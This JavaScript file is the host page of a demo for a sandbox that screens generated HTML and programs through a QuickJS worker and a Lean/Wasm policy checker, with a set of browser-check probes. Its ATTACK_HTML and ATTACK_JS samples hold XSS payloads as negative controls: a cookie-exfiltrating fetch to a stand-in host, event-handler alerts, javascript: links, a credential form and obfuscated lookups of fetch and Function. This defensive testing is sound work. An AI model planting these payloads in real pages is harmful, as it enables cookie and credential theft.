// Demo host application. Wires together: QuickJS worker runtime -> view string
// -> POLICY WORKER (bounded parse5 preprocessing + candidate construction +
// LEAN/WASM ACCEPTANCE) -> one-time acceptance record -> sandboxed frame.
//
// The render path is createGuard: it owns the frame, the policy Worker with
// its Lean/Wasm authority, the private port that carries accepted trees from
// that Worker to the frame, and the QuickJS Worker. This demo therefore has no
// code path that renders a tree the JavaScript checker alone approved -- it
// never handles a tree at all.
//
// Three deliberate properties of this wiring:
//   * No parsing happens on this thread. Hostile markup costs the policy
//     Worker time, not the host UI, and a request that exceeds its budget
//     terminates that Worker instead of freezing the page.
//   * Lean/Wasm is the acceptance authority and there is no fallback. If the
//     checker does not start, every document is refused and the status says
//     so. Rendering without it is not a degraded mode; it is a bypass.
//   * There is no AST gate. Generated JavaScript is not statically screened;
//     it is compiled inside QuickJS, which has no DOM, network or host
//     objects, and its interface is checked there. A program that reaches for
//     a host capability fails inside the sandbox, and that failure is shown.
import manifest from "../dist/frame-manifest.js";
import { createSandboxFrame } from "../src/host.js";
import { createRuntimeController } from "../src/runtime/controller.js";
import { createPolicySession } from "../src/policy-client.js";
import { PREPROCESS_LIMITS } from "../src/policy-protocol.js";
import { setClassAllowlist } from "../src/policy.js";
// The two Worker payloads, embedded as source by scripts/build.mjs. Both
// Workers are created from blob: URLs, never from a script URL:
//   * a cross-origin Worker URL fails on every engine under every CSP,
//     including no CSP, so the payload has to travel with the bundle; and
//   * a blob: Worker inherits this document's CSP, while a same-origin
//     network Worker does not -- it would get eval, new Function and
//     unrestricted fetch back. The demo's old `new Worker("/dist/...")` had
//     exactly that containment hole. See docs/csp.md.
import workerSource from "guard:worker-source";
import policyWorkerSource from "guard:policy-worker-source";
import { createBlobWorker } from "../src/startup.js";
import { createGuardWith } from "../src/guard.js";

// The frontend now lives in the policy Worker, but src/host.js keeps its own
// defence-in-depth re-check of any tree handed to the frame, so the host copy
// of the policy still needs the build's class allowlist. Removing that second
// check is Phase 6 work, not this phase's.
setClassAllowlist(manifest.classes);

// The integrated API, assembled from source the same way src/cdn-full.js
// assembles the shipped createGuard: same frame, same policy Worker, same
// QuickJS Worker, all from blob: URLs.
const createGuard = createGuardWith({
  manifest,
  createFrame: (options) => createSandboxFrame(options),
  createPolicySession: (options) => createPolicySession({ ...options, createWorker: () => createBlobWorker(policyWorkerSource) }),
  createRuntime: (options) => createRuntimeController({ ...options, createWorker: () => createBlobWorker(workerSource) }),
});

const $ = (id) => document.getElementById(id);
const statusEl = $("status");
const reportEl = $("report");

function setStatus(text, bad = false) {
  statusEl.textContent = text;
  statusEl.classList.toggle("bad", bad);
}

function report(lines) {
  reportEl.textContent = lines.join("\n");
}

let guard = null;
let policy = null; // probe-only: the low-level session the negative controls drive
let probeFrame = null; // probe-only: a legacy record-path frame for the acceptance controls

// Startup diagnostics, kept as plain data so the browser check can read them.
// Each entry is one stage outcome: a CSP failure in the frame produces no
// violation report anywhere, so this list plus the per-stage codes are the
// only account of what happened.
const startupLog = [];
function startupNote(text, data = null) {
  startupLog.push(data ? `${text} ${JSON.stringify(data)}` : text);
}

// A StartupError already bounds its own fields; anything else is bounded here.
function startupFailure(error) {
  if (error && typeof error.toJSON === "function") return error.toJSON();
  return { code: null, stage: null, detail: String(error && error.message).slice(0, 300) };
}

// One policy Worker per demo instance. It is recreated on demand: a
// terminated session (timeout or worker error) is replaced with a fresh one
// with a new session id on the next request.
function policySession() {
  if (!policy) {
    policy = createPolicySession({
      createWorker: () => createBlobWorker(policyWorkerSource),
      classes: manifest.classes,
      onTerminated: ({ code, detail, stage }) => {
        if (code !== "disposed") startupNote(`probe policy worker terminated (${code}${stage ? ` at stage ${stage}` : ""})`, { detail: detail ?? null });
      },
    });
    // Startup is reported per stage, not as one aggregate failure.
    policy.whenReady().then(
      () => { startupNote("policy worker: channel handshake complete"); },
      (error) => { startupNote(`policy worker startup failed: ${error.code ?? error.message}`); },
    );
    // The wasm-init stage: the Lean authority instantiating inside the Worker.
    // Until this resolves nothing can be accepted, and if it rejects nothing
    // ever will be -- there is no JavaScript fallback.
    policy.whenCheckerReady().then(
      (checker) => { startupNote("policy worker: lean checker ready", checker); },
      (error) => { startupNote(`lean checker startup failed: ${error.code ?? error.message}`); },
    );
  }
  return policy;
}

// The whole render path is the integrated API: one object owns the frame, the
// policy Worker with its Lean/Wasm authority, the private port between them,
// and the QuickJS Worker. The demo never wires those together itself, and has
// no code path that could render a tree the JavaScript checker alone approved.
let guardReadyInfo = null;
const guardStatus = [];

async function guardInstance() {
  if (guard) return guard;
  guard = await createGuard({
    container: $("frame-container"),
    onStatus: ({ kind, detail }) => {
      guardStatus.push({ kind, detail });
      if (kind === "ready") { guardReadyInfo = detail.frame ?? null; startupNote("guard ready: frame, channel and Lean checker are up", detail); }
      else if (kind === "startup-warning") startupNote(`startup warning: ${detail.code}`, detail);
      else if (kind === "runtime-stopped") setStatus(`runtime stopped (${detail.reason?.code ?? "?"}); last validated view retained`, true);
      else if (kind === "session-terminated") setStatus(`policy worker terminated (${detail.code ?? "?"})`, true);
      else if (kind === "event-dropped") startupNote(`event dropped (${detail.reason?.code ?? "?"})`);
    },
  });
  return guard;
}

// A new document replaces whatever is shown. With a program, its FIRST view is
// what renders and the HTML box is not a fallback -- that is the API contract.
async function run() {
  const html = $("html").value;
  const js = $("js").value.trim();
  const lines = [];
  let g;
  try {
    g = await guardInstance();
  } catch (error) {
    const info = startupFailure(error);
    startupNote(`guard startup failed: ${error.code ?? error.message}`, info);
    setStatus(`startup failed (${error.code ?? "unknown"}); nothing can render: ${error.hint ?? error.message}`, true);
    // The hint names the directive to change; put it in the report too, since a
    // frame/CSP failure produces no securitypolicyviolation to read otherwise.
    report([`startup failed (${info.code ?? "unknown"} at stage ${info.stage ?? "?"}): ${info.hint ?? error.message}`]);
    return;
  }
  const t0 = performance.now();
  let result;
  try {
    result = js ? await g.render({ html, program: js, data: HOST_DATA }) : await g.render({ html });
  } catch (error) {
    // Infrastructure, not content: a StartupError from the QuickJS Worker.
    startupNote(`quickjs worker startup failed: ${error.code ?? error.message}`, startupFailure(error));
    setStatus(`runtime startup failed (${error.code ?? "unknown"}); nothing rendered`, true);
    return;
  }
  const ms = (performance.now() - t0).toFixed(1);
  if (result.status === "rendered") {
    lines.push(`${js ? "interactive program" : "static document"}: accepted by Lean/Wasm and rendered in ${ms} ms`);
    if (result.diagnostics) {
      lines.push(`  ${result.diagnostics.total} change(s) during preprocessing`);
      for (const c of result.diagnostics.records) lines.push("  - " + describeChange(c));
    }
    setStatus(js
      ? "interactive: running in QuickJS worker, rendering in sandboxed frame"
      : "static document rendered");
  } else if (result.status === "superseded") {
    lines.push("superseded by a newer document");
  } else if (js && result.reason.code === "program-rejected") {
    // QuickJS refused the program: it does not meet the interface or it reached
    // for a capability that does not exist inside the sandbox. Not a CSP or
    // startup problem, and the supplied HTML is not a fallback.
    lines.push(`QuickJS refused the program: ${result.reason.detail ?? result.reason.code}`);
    setStatus("interaction program failed in QuickJS; nothing rendered", true);
  } else {
    lines.push(`${js ? "view" : "document"} rejected: ${JSON.stringify(result.reason)} (${ms} ms)`);
    setStatus(`${js ? "view" : "document"} rejected (${result.reason.code}); nothing rendered`, true);
  }
  report(lines);
}

// Compact description of one preprocessing change, for the demo report.
function describeChange(c) {
  const where = c.path ? ` at ${c.path.join("/")}` : "";
  switch (c.kind) {
    case "removed-element": return `removed <${c.tag}>${c.ns ? ` (${c.ns})` : ""}${c.why ? ` [${c.why}]` : ""}${where}`;
    case "unwrapped-element": return `unwrapped <${c.tag}>${where}`;
    case "removed-attribute": return `removed ${c.tag}[${c.name}]${c.why ? ` [${c.why}]` : ""}${where}`;
    case "rewrote-attribute": return `rewrote ${c.tag}[${c.name}]${where}`;
    case "removed-node": return `removed ${c.what}${where}`;
    default: return JSON.stringify(c);
  }
}


// ---------------------------------------------------------------------------
// Samples

const BENIGN_HTML = `<div class="card stack">
  <h2 class="title">Quarterly revenue</h2>
  <p class="muted small">Static document shown until the interaction program initializes.</p>
</div>`;

// Host-owned dataset. It is injected into the runtime as a frozen global named
// `data` and never passes through model output.
const HOST_DATA = [
  { region: "North", q1: 120, q2: 150, q3: 170, q4: 210 },
  { region: "South", q1: 90, q2: 95, q3: 130, q4: 160 },
  { region: "East", q1: 200, q2: 180, q3: 190, q4: 230 },
  { region: "West", q1: 60, q2: 80, q3: 85, q4: 120 },
];

const BENIGN_JS = `// \`data\` is supplied by the host: an array of { region, q1, q2, q3, q4 }.
const initialState = { tab: "chart", quarter: "q4", sortKey: "region", sortDir: 1, filter: "", hover: null, count: 0 };

function update(state, event) {
  switch (event.action) {
    case "tab": return { ...state, tab: event.dataValue };
    case "quarter": return { ...state, quarter: event.value };
    case "sort": {
      const dir = state.sortKey === event.dataValue ? -state.sortDir : 1;
      return { ...state, sortKey: event.dataValue, sortDir: dir };
    }
    case "filter": return { ...state, filter: event.value || "" };
    case "hover": return { ...state, hover: event.type === "pointerleave" ? null : event.dataValue };
    case "increment": return event.type === "click" ? { ...state, count: state.count + 1 } : state;
    default: return state;
  }
}

function esc(s) {
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/"/g, "&quot;");
}

function rows(state) {
  const f = state.filter.toLowerCase();
  return data
    .filter((r) => r.region.toLowerCase().includes(f))
    .sort((a, b) => (a[state.sortKey] > b[state.sortKey] ? 1 : -1) * state.sortDir);
}

function chart(state) {
  const rs = rows(state);
  const max = Math.max(1, ...rs.map((r) => r[state.quarter]));
  const barW = 60, gap = 20, h = 160, left = 30;
  const width = left + rs.length * (barW + gap);
  const bars = rs.map((r, i) => {
    const bh = Math.round((r[state.quarter] / max) * (h - 30));
    const x = left + i * (barW + gap);
    const hovered = state.hover === r.region;
    return \`<g data-action="hover" data-hover data-value="\${esc(r.region)}">
      <rect class="\${hovered ? "bar-alt" : "bar"}" x="\${x}" y="\${h - bh - 20}" width="\${barW}" height="\${bh}" rx="3"></rect>
      <text class="label" x="\${x + barW / 2}" y="\${h - 6}" text-anchor="middle">\${esc(r.region)}</text>
      <text class="label" x="\${x + barW / 2}" y="\${h - bh - 26}" text-anchor="middle">\${r[state.quarter]}</text>
    </g>\`;
  }).join("");
  return \`<svg class="chart" viewBox="0 0 \${width} \${h}" role="img" aria-label="Revenue by region">
    <line class="axis" x1="\${left - 5}" y1="\${h - 20}" x2="\${width}" y2="\${h - 20}"></line>\${bars}</svg>
    <div class="row small muted">\${state.hover ? \`<span class="tooltip">\${esc(state.hover)}: \${rows(state).find((r) => r.region === state.hover)?.[state.quarter] ?? ""}</span>\` : "Hover a bar"}</div>\`;
}

function table(state) {
  const th = (k, label) => \`<th data-action="sort" data-value="\${k}" aria-sort="\${state.sortKey === k ? (state.sortDir > 0 ? "ascending" : "descending") : "none"}">\${label}</th>\`;
  return \`<table class="table"><thead><tr>\${th("region", "Region")}\${th("q1", "Q1")}\${th("q2", "Q2")}\${th("q3", "Q3")}\${th("q4", "Q4")}</tr></thead><tbody>
    \${rows(state).map((r) => \`<tr><td>\${esc(r.region)}</td><td class="right">\${r.q1}</td><td class="right">\${r.q2}</td><td class="right">\${r.q3}</td><td class="right">\${r.q4}</td></tr>\`).join("")}
  </tbody></table>\`;
}

function view(state) {
  return \`<div class="card stack">
    <h2 class="title">Quarterly revenue</h2>
    <div class="tabs">
      <button class="tab \${state.tab === "chart" ? "tab-active" : ""}" data-action="tab" data-value="chart">Chart</button>
      <button class="tab \${state.tab === "table" ? "tab-active" : ""}" data-action="tab" data-value="table">Table</button>
    </div>
    <div class="row">
      <label for="filter">Filter</label>
      <input id="filter" class="input" data-action="filter" value="\${esc(state.filter)}" placeholder="region">
      <label for="quarter">Quarter</label>
      <select id="quarter" class="input" data-action="quarter">
        \${["q1", "q2", "q3", "q4"].map((q) => \`<option value="\${q}" \${state.quarter === q ? "selected" : ""}>\${q.toUpperCase()}</option>\`).join("")}
      </select>
      <span class="grow"></span>
      <button class="btn" data-action="increment">Clicked \${state.count}</button>
    </div>
    \${state.tab === "chart" ? chart(state) : table(state)}
  </div>\`;
}`;

const ATTACK_HTML = `<div class="card" id="root" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">
  <h2 class="title" onclick="alert(1)">Attack sample</h2>
  <script>fetch("https://example.invalid/exfil?" + document.cookie)</script>
  <img src="https://example.invalid/pixel.gif">
  <a href="https://example.invalid/phish" target="_blank">Click me</a>
  <form action="https://example.invalid/post" method="post"><input type="password" name="pw" autocomplete="current-password"><button>Submit</button></form>
  <iframe src="https://example.invalid/"></iframe>
  <math><mi xlink:href="data:x,<script>alert(1)</script>">x</mi></math>
  <svg><use href="#x"></use><image href="https://example.invalid/i.svg"></image><foreignObject><img src=x onerror="alert(2)"></foreignObject><desc><img src=x onerror="alert(3)"></desc><rect fill="url(https://example.invalid/p.svg#g)" width="1e999" height="10"></rect><animate attributeName="x" to="1"></animate><a href="javascript:alert(4)"><text x="10" y="20">svg link</text></a></svg>
  <style>@import url(https://example.invalid/c.css)</style>
  <p title="ok" class="muted evil-class">Visible text with bidi \u202E override and <b>bold</b></p>
  <details open ontoggle="alert(5)"><summary>Summary</summary></details>
  <input type="text" accesskey="x" autofocus tabindex="5" contenteditable>
</div>`;

// No static denylist screens this program. Every lookup below is written with
// computed access precisely so that a name-based check would miss it; they
// fail because the capabilities do not exist inside QuickJS. The first one
// throws while the program is being initialized, so the static document stays
// on screen with the failure reported.
const ATTACK_JS = `const host = globalThis;
const reach = (name) => host[name];
const initialState = { n: 0, leak: reach("fe" + "tch")("https://example.invalid/x") };
function update(state, event) {
  const dyn = reach("Func" + "tion");
  if (dyn) new dyn("return this")().fetch("https://example.invalid/y");
  return { n: state.n + 1 };
}
function view(state) {
  return '<img src="https://example.invalid/leak?' + state.n + '"><script>alert(1)</script><p onclick="alert(2)">n=' + state.n + '</p>';
}`;

let probeRuntime = null;
async function bootProbe() {
  // Starting the probe policy session creates its blob: Worker, which resolves
  // whenReady() -> "policy worker: channel handshake complete" and
  // whenCheckerReady() -> "policy worker: lean checker ready".
  policySession().start().catch((error) => startupNote(`probe policy start failed: ${error.code ?? error.message}`));
  // A probe QuickJS Worker, loaded with a trivial program, so the wasm-init
  // stage inside a blob: Worker is observed too.
  try {
    probeRuntime = createRuntimeController({ createWorker: () => createBlobWorker(workerSource) });
    await probeRuntime.load("var initialState={};function update(s){return s}function view(){return ''}");
    startupNote("quickjs worker: wasm-init stage complete");
  } catch (error) {
    startupNote(`probe quickjs start failed: ${error.code ?? error.message}`);
  }
}
bootProbe();

$("benign").addEventListener("click", () => { $("html").value = BENIGN_HTML; $("js").value = BENIGN_JS; run(); });
$("attack").addEventListener("click", () => { $("html").value = ATTACK_HTML; $("js").value = ATTACK_JS; run(); });
$("run").addEventListener("click", run);
$("html").value = BENIGN_HTML;
$("js").value = BENIGN_JS;
run();

// ---------------------------------------------------------------------------
// Host-side probe used by scripts/browser-check.mjs. It only calls the same
// public policy-session API the demo uses; it cannot render anything and it
// grants no capability to generated content.
window.__guardPolicyProbe = {
  stats: () => policySession().stats,
  // The shipped preprocessing limits, so the browser check asserts against the
  // build rather than against a number copied into the checker script.
  limits: () => ({ ...PREPROCESS_LIMITS }),
  // Per-stage startup outcomes. Read by scripts/browser-check.mjs, including
  // under a deliberately broken host CSP (serve.mjs ?cspOmit=...), which is
  // the only way to demonstrate that the codes are actually reachable.
  startupLog: () => startupLog.slice(),
  async policyReady() {
    try {
      await policySession().whenReady();
      return { ok: true };
    } catch (error) {
      return { ok: false, ...startupFailure(error) };
    }
  },
  // The wasm-init stage for the Lean authority, and what it reports about
  // itself. `checker` is bounded plain data from the Worker.
  async checkerReady() {
    try {
      const checker = await policySession().whenCheckerReady();
      return { ok: true, checker };
    } catch (error) {
      return { ok: false, ...startupFailure(error) };
    }
  },
  // NEGATIVE CONTROL, in the browser, on the shipped bytes: a fabricated
  // acceptance record and a replayed one must both fail to render. Neither
  // touches the policy Worker; both are refused by the frame's render path.
  async acceptanceControls() {
    const result = await policySession().preprocess('<p class="card">control</p>');
    if (result.status !== "accepted") return { accepted: false, reason: result.reason ?? null };
    // A dedicated record-path frame, off-screen, so this control is separate
    // from the guard's own frame (which is port-bound and takes no records).
    if (!probeFrame) {
      const box = document.createElement("div");
      box.style.display = "none";
      document.body.appendChild(box);
      probeFrame = createSandboxFrame({ container: box, manifest, claimAcceptance: (token) => policySession().claimAcceptance(token) });
    }
    const forged = { ...result.acceptance, nonce: "0".repeat(result.acceptance.nonce.length) };
    const forgedRendered = await probeFrame.render(forged);
    const bareTreeRendered = await probeFrame.render(result.tree);
    // The one-time property is checked through the session, so this control
    // does not replace the document the rest of the page is asserting about.
    const genuine = policySession().claimAcceptance(result.acceptance).ok;
    const replayed = policySession().claimAcceptance(result.acceptance).ok;
    return {
      accepted: true,
      authority: result.authority,
      checkerVersion: result.stats.checkerVersion,
      forgedRendered,
      bareTreeRendered,
      genuine,
      replayed,
    };
  },
  async frameReady() {
    try {
      await guardInstance();
      return { ok: true, info: guardReadyInfo };
    } catch (error) {
      return { ok: false, ...startupFailure(error) };
    }
  },
  // Bounded rejection of hostile markup, with the host thread free.
  async preprocess(html, options) {
    const t0 = performance.now();
    const result = await policySession().preprocess(html, options);
    return { status: result.status, reason: result.reason ?? null, ms: performance.now() - t0 };
  },
  // A request budget small enough that the Worker cannot answer in time:
  // the client must terminate it and settle the request.
  async forceTimeout(html) {
    const session = policySession();
    const before = session.sessionId;
    const result = await session.preprocess(html, { timeoutMs: 1 });
    return {
      status: result.status,
      code: result.reason?.code ?? null,
      terminated: session.alive === false,
      sessionChanged: session.sessionId !== before,
      pending: session.pendingCount,
    };
  },
  // Wasm and string-evaluation probe, in the host realm and inside a blob:
  // Worker (which inherits this document's CSP). This is how the browser
  // check measures, rather than quotes, two claims: that 'wasm-unsafe-eval'
  // is what Wasm needs, and that it does NOT re-enable eval or new Function.
  // The module is the 8-byte empty module; nothing is executed.
  async wasmProbe() {
    const bytes = new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]);
    const tryIt = (fn) => { try { return fn(); } catch (error) { return `refused:${error.name}: ${String(error.message).slice(0, 160)}`; } };
    const tryAsync = async (fn) => { try { return await fn(); } catch (error) { return `refused:${error.name}: ${String(error.message).slice(0, 160)}`; } };
    // The synchronous constructor and the async forms are probed separately:
    // they are not enforced identically on every engine, and the production
    // QuickJS path uses the async one.
    const host = {
      sync: tryIt(() => { new WebAssembly.Module(bytes); return "ok"; }),
      async: await tryAsync(async () => { await WebAssembly.compile(bytes); return "ok"; }),
      instantiate: await tryAsync(async () => { await WebAssembly.instantiate(bytes); return "ok"; }),
    };
    const source = "self.onmessage=function(){"
      + "var b=new Uint8Array([0,97,115,109,1,0,0,0]);"
      + "function t(f){try{return f()}catch(e){return 'refused:'+e.name+': '+String(e.message).slice(0,160)}}"
      + "function ta(f){return Promise.resolve().then(f).then(function(v){return v}).catch(function(e){return 'refused:'+e.name+': '+String(e.message).slice(0,160)})}"
      + "Promise.all([ta(function(){return WebAssembly.compile(b).then(function(){return 'ok'})}),"
      + "ta(function(){return WebAssembly.instantiate(b).then(function(){return 'ok'})})])"
      + ".then(function(r){self.postMessage({"
      + "wasmSync:t(function(){new WebAssembly.Module(b);return 'ok'}),"
      + "wasmAsync:r[0],wasmInstantiate:r[1],"
      + "eval:t(function(){return String(eval('1+1'))}),"
      + "newFunction:t(function(){return String(new Function('return 2')())})"
      + "})})};";
    let worker;
    try {
      worker = createBlobWorker(source);
    } catch (error) {
      return { host, blobWorker: { created: false, ...startupFailure(error) } };
    }
    const inWorker = await new Promise((resolve) => {
      const timer = setTimeout(() => resolve({ timedOut: true }), 10_000);
      worker.addEventListener("message", (event) => { clearTimeout(timer); resolve(event.data); });
      worker.addEventListener("error", () => { clearTimeout(timer); resolve({ workerError: true }); });
      worker.postMessage("go");
    });
    worker.terminate();
    return { host, blobWorker: { created: true, ...inWorker } };
  },
  // The sibling bound, measured in this engine rather than quoted from the
  // Node audit. The Lean checker recurses once per sibling and that recursion
  // lives on the engine's own call stack, which no build flag configures, so
  // `maxRawNodes` is what keeps it inside. At the bound the result must be
  // STRUCTURED -- accepted or rejected -- and the Worker must still be alive;
  // one node past it, preprocessing must refuse. A crash would show up as a
  // terminated session instead.
  async siblingBound(atLimit, pastLimit) {
    const session = policySession();
    const at = await session.preprocess("<p></p>".repeat(atLimit));
    const aliveAfterLimit = session.alive;
    const past = await session.preprocess("<p></p>".repeat(pastLimit));
    return {
      at: { status: at.status, code: at.reason?.code ?? null, authority: at.authority ?? null },
      aliveAfterLimit,
      past: { status: past.status, code: past.reason?.code ?? null, limit: past.reason?.limit ?? null },
      aliveAtEnd: session.alive,
    };
  },
  // After a termination the next request must work again on a fresh Worker.
  async recover() {
    const result = await policySession().preprocess('<p class="muted">recovered</p>');
    return { status: result.status, sessionId: policySession().sessionId };
  },
};
